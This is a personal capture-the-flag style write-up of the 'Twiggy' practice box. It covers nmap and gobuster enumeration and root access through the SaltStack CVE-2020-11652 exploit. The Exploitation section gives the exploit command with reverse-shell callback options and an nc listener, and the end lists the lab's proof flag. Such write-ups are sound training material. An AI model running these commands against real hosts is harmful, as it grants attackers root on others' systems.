---
Date: 2024-08-31
Platform: PG-Practice
Category: Linux
Difficulty: Easy
Status: Complete
IP: 192.168.222.62
Writeup: https://systemweakness.com/twiggy-proving-grounds-oscp-prep-practice-easy-b6d9c05c3be4
---
# Twiggy

Went down the rabbit hole with port 80 & port 8000 too quickly, thinking this would require SQL injection or some sort of weird user enumeration to get into a web platform. 

Turns out the I needed to run nmap again with a full port scan (`-p- -T5`) and pick up ALL the ports before an aggressive service scan (`-A -p 22,55,ect`). 

2nd scan picked up `4505` and `4506` which correspond to ZeroMQ ZMTP 2.0 (saltStack). Looking up Saltstack showed a vulnerability (CVE-2020-11652)
# Resolution summary
- Basic Nmap scan, found 4 ports
	- Checked OpenSSH 7.4 but exploits wouldn't work (user enumeration)
	- Checked website (p=80) and found Mezzanine site
		- Attempted SQL through login
- Re-ran Nmap scan with `-p- -T` followed by `-A` for found ports
	- Identified 4505 & 4506 - ZeroMQ ZMTP 2.0 (SaltStack)
- Found python exploit for Saltstack
	- Checked python code
	- Ran netcat listener on port 80
	- Ran exploit - root on listener. 

## Improved skills
- ALWAYS run Nmap twice (and use `-p- -T5`)
- Try listening on a common port (eg. port 80) if your exploit doesn't initially work

## Used tools
- nmap
- gobuster: `gobuster dir -u  http://192.168.222.62:8000 -w //usr/share/dirb/wordlists/common.txt`

---

# Information Gathering
Scanned all TCP ports:
```bash
sudo nmap -p- -T5 192.168.222.62
sudo nmap -p 22,53,80,4505,4506,8000 -A 192.168.222.62
```

Enumerated open TCP ports:
```
sudo nmap -p- -T5 192.168.222.62 
PORT     STATE SERVICE
22/tcp   open  ssh
53/tcp   open  domain
80/tcp   open  http
4505/tcp open  unknown
4506/tcp open  unknown
8000/tcp open  http-alt

[686.7sec = 11.4mins]
---
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey: 
|   2048 44:7d:1a:56:9b:68:ae:f5:3b:f6:38:17:73:16:5d:75 (RSA)
|   256 1c:78:9d:83:81:52:f4:b0:1d:8e:32:03:cb:a6:18:93 (ECDSA)
|_  256 08:c9:12:d9:7b:98:98:c8:b3:99:7a:19:82:2e:a3:ea (ED25519)
53/tcp   open  domain  NLnet Labs NSD
80/tcp   open  http    nginx 1.16.1
|_http-server-header: nginx/1.16.1
|_http-title: Home | Mezzanine
4505/tcp open  zmtp    ZeroMQ ZMTP 2.0
4506/tcp open  zmtp    ZeroMQ ZMTP 2.0
8000/tcp open  http    nginx 1.16.1
|_http-server-header: nginx/1.16.1
|_http-title: Site doesn't have a title (application/json).
|_http-open-proxy: Proxy might be redirecting requests
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|router
Running (JUST GUESSING): Linux 3.X|4.X (88%), MikroTik RouterOS 6.X (85%)
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4 cpe:/o:mikrotik:routeros:6.15
Aggressive OS guesses: Linux 3.11 - 4.1 (88%), Linux 3.16 (88%), Linux 3.10 - 3.12 (86%), Linux 4.4 (86%), Linux 4.9 (86%), Linux 3.2.0 (85%), MikroTik RouterOS 6.15 (Linux 3.3.5) (85%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 4 hops

TRACEROUTE (using port 80/tcp)
HOP RTT       ADDRESS
1   604.31 ms 192.168.45.1
2   604.23 ms 192.168.45.254
3   604.32 ms 192.168.251.1
4   604.40 ms 192.168.222.62

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 38.04 seconds
```

---

# Enumeration
## Port 22 - OpenSSH 7.4 (protocol 2.0)
## Port 55 - NLnet Labs NSD
## Port 80 - HTTP (nginx 1.16.1)
Mezzanine website
![[Pasted image 20240831212036.png]]
Login page
![[Pasted image 20240831212120.png]]
## Port 4505 - ZeroMQ ZMTP 2.0 (SaltStack)
## Port 4506 -  ZeroMQ ZMTP 2.0 (SaltStack)
## Port 8000 - HTTP (Apache)
`gobuster dir -u  http://192.168.222.62:8000 -w //usr/share/dirb/wordlists/common.txt
![[Pasted image 20240831200454.png]]`http:\\192.168.222.62:8000\index` (Same as `login` and `run`)
![[Pasted image 20240831200636.png]]
# Exploitation
## Name of the technique
https://github.com/Al1ex/CVE-2020-11652/blob/main/CVE-2020-11652.py

Exploit: `python 48421.py --master 192.168.222.62 --port 4506 -lh 192.168.45.246 -lp 80 --exec-choose master`
Caught reverse shell with NetCat on port 80: `nc -lvnp 80`

---
# Lateral Movement
## Local Enumeration
Not required (logged in as root)
## Lateral Movement vector
Not required (logged in as root)

---
# Privilege Escalation
Not required (logged in as root)

---
# Trophy & Loot
proof.txt - a985dd04611192b6db023d6f877a1503